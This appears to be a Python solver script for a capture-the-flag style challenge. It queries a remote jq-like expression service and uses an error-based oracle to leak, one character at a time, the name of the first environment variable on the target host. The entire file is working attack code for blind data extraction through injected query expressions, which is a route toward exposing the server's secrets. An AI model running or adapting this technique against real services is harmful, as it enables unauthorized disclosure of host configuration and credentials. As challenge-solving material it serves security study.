import check_remote, solve_remote_live, json

chains = {int(k): v for k, v in json.loads(solve_remote_live.EMBEDDED_CHAINS_JSON).items()}

def get_present_values(query_expr):
    present = set()
    # We query all values in chains to see which ones are present
    # To do it quickly, we can query in batches of 16
    values = sorted(chains.keys())
    batch_size = 16
    for i in range(0, len(values), batch_size):
        batch = values[i:i+batch_size]
        exprs = []
        for v in batch:
            pred = solve_remote_live.predicate(chains[v])
            exprs.append(f"{query_expr}|{pred}|error")
        # Query
        for v, expr in zip(batch, exprs):
            res = check_remote.query(expr)
            if res == "error":
                present.add(v)
    return present

print("Scanning first key elements...")
present_adds = get_present_values("env|keys|first|explode|tostream|flatten|add")
print("Present adds:", sorted(present_adds))

# Now decode position and characters
# For each position i, and character c: i + ord(c) = value
# Since it is a key, characters are A-Z, a-z, 0-9, _
charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz0123456789"
possible_positions = {}
for val in present_adds:
    for pos in range(30):
        c_ord = val - pos
        if 0 <= c_ord < 256:
            c = chr(c_ord)
            if c in charset:
                possible_positions.setdefault(pos, []).append((c, val))

for pos in sorted(possible_positions.keys()):
    chars = possible_positions[pos]
    print(f"Pos {pos}: {repr(chars)}")
